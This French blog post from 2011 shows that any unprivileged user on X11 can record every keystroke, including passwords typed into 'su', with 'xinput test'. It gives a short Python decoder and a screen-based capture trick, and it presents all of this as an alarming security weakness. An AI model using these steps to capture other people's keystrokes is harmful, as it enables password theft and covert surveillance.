---
layout: post
title: 'Keylogger sous GNU/Linux : enregistrer les touches tapées au clavier'
date: 2011-11-01 22:09:57+01:00
tags:
- planet-libre
- puf
---

En tant que [_root_][root], il est bien sûr potentiellement possible de faire ce que
l'on veut sur sa machine, comme enregistrer toutes les touches tapées au clavier
([keylogger][]).

[root]: http://fr.wikipedia.org/wiki/Utilisateur_root
[keylogger]: http://fr.wikipedia.org/wiki/Enregistreur_de_frappe

{: .center}
![keyboard]({{ site.assets }}/keylogger/keyboard.png)

Mais aussi incroyable (et inquiétant) que cela puisse paraître, il est possible
de faire exactement la même chose… sans être _root_.


## Démonstration

Et en plus, c'est tout simple : il suffit pour un programme d'écouter les
événements clavier envoyés par le [serveur X][]. Prenons un outil qui le fait
déjà (ça nous évitera de le coder), `xinput` :

[serveur x]: http://fr.wikipedia.org/wiki/X_Window_System

    sudo apt-get install xinput

Pour obtenir la liste des périphériques utilisables :

    xinput list

Repérer la ligne concernant le clavier (contenant « `AT` ») et noter son _id_ (ici `11`).

    $ xinput list | grep AT
        ↳ AT Translated Set 2 keyboard            	id=11	[slave  keyboard (3)]

Puis démarrer l'écoute sur ce périphérique dans un terminal :

    xinput test 11

Au fur et à mesure que l'on tape du texte, la sortie standard de `xinput`
indique quelles touches sont tapées :

    key press   56 
    key release 56 
    key press   32 
    key release 32 
    key press   57 
    key release 57 
    key press   44 
    key release 44 
    key press   32 
    key press   30 
    key release 32 
    key release 30 
    key press   27 
    key release 27



Cela fonctionne même lorsqu'on écrit dans une autre application, quelque soit
l'utilisateur qui l'a démarrée. En particulier, si dans un autre terminal on
exécute la commande suivante, le mot de passe est bien capturé :

    $ su -
    Mot de passe : 

Un programme avec de simples droits utilisateur peut donc écouter tout ce qui
est tapé au clavier (et donc l'enregistrer, l'envoyer à un serveur…).


## Décodage


### Convertisseur

La sortie de `xinput` n'est pas très utilisable en pratique. Pour la décoder, un
programme d'une vingtaine de lignes en _Python_ suffit (fortement inspiré de [ce
PoC][poc]). Appelons-le [`xinput-decoder.py`][xinput-decoder.py] :

[poc]: http://ardoris.wordpress.com/2011/04/24/linux-keylogger-proof-of-concept/
[xinput-decoder.py]: http://dl.rom1v.com/keylogger/xinput-decoder.py

{% highlight python %}
#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import re, sys
from subprocess import *

def get_keymap():
    keymap = {}
    table = Popen(['xmodmap', '-pke'], stdout=PIPE).stdout
    for line in table:
        m = re.match('keycode +(\d+) = (.+)', line.decode())
        if m and m.groups()[1]:
            keymap[m.groups()[0]] = m.groups()[1].split()[0]
    return keymap

if __name__ == '__main__':
    keymap = get_keymap();
    for line in sys.stdin:
        m = re.match('key press +(\d+)', line.decode())
        if m:
            keycode = m.groups()[0]
            if keycode in keymap:
                print keymap[keycode],
            else:
                print '?' + keycode,
{% endhighlight %}

Pour convertir le résultat à la volée :

    xinput test 11 | ./xinput-decoder.py



### Problème de redirection

Le problème, c'est que lorsqu'on redirige la sortie de `xinput` dans un fichier
ou en entrée d'un autre programme, le contenu ne s'affiche que par salves
(d'environ 128 caractères apparemment). Sans doute une histoire de [buffer][], à
mon avis activé uniquement lorsque la fonction [`isatty()`][isatty] retourne
_true_.

[buffer]: http://fr.wikipedia.org/wiki/M%C3%A9moire_tampon
[isatty]: http://www.kernel.org/doc/man-pages/online/pages/man3/isatty.3.html
http://www.kernel.org/doc/man-pages/online/pages/man3/isatty.3.html

Pour contourner le problème et récupérer les dernières touches tapées, il est
possible de démarrer la commande dans un `screen` :

    screen xinput test 11

puis, à la fin de la capture, d'enregistrer le contenu dans un fichier. Pour
cela, dans le `screen` ainsi ouvert, taper `Ctrl+A`, `:`, puis `hardcopy -h
/tmp/log`.  De cette manière, `/tmp/log` contiendra toute la capture.

Pour convertir le résultat :

    $ ./xinput-parser.py < /tmp/log
    s u space minus Return p a s s w o r d Return a p t minus g e t space u p d a t e Return Control_L a colon


### Améliorations

Une solution plus pratique serait peut-être de démarrer `xinput` par le
programme _Python_, en lui faisant croire qu'il écrit dans un _TTY_ (ce que je
ne sais pas faire). [Quelqu'un][better-keylogger] l'a fait [en
_Perl_][keylog2].

Il faudrait également prendre en compte le relâchement des touches dans le
décodeur, car lorsqu'il affiche `Shift_L a b`, nous n'avons aucun moyen de
savoir si la touche `Shift` a été relâchée avant le `a`, entre le `a` et le `b`,
ou après le `b`.

[better-keylogger]: http://www.kirsle.net/blog/kirsle/building-a-better-keylogger
[keylog2]: http://sh.kirsle.net/keylog2


## Liens

Merci à [Papillon-butineur][] de m'avoir fait découvrir ce fonctionnement étonnant du _serveur X_.

Je vous recommande le billet suivant (en anglais) ainsi que ses commentaires :
[The Linux Security Circus: On GUI isolation][gui-isolation].

**EDIT :** En 2016, [tuxicoman][] a proposé une implémentation en C++.

[papillon-butineur]: http://papillon-butineur.blogspot.com/2011/10/keylogger-sous-linux.html
[gui-isolation]: http://theinvisiblethings.blogspot.com/2011/04/linux-security-circus-on-gui-isolation.html
[tuxicoman]: https://tuxicoman.jesuislibre.net/2016/09/keylogger-pour-x-server.html
